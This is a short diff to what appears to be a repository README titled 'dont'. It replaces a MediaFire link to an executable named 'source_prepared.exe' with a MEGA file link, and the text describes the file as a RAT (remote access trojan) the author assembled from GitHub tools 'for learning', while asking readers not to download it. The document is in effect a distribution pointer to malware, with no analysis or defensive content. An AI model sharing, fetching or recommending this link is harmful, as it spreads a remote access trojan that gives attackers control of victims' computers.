@@ -1,4 +1,4 @@
 # dont
 uh
-https://www.mediafire.com/file/stkvb4ihzhw5whg/source_prepared.exe/file
+https://mega.nz/file/NrVCAALQ#O91zx9IDSG0v5UtMXah8fSsJDlJVTapou5G6elXsGVQ
 this is a rat that i made using tools from github for learning. please dont download it.
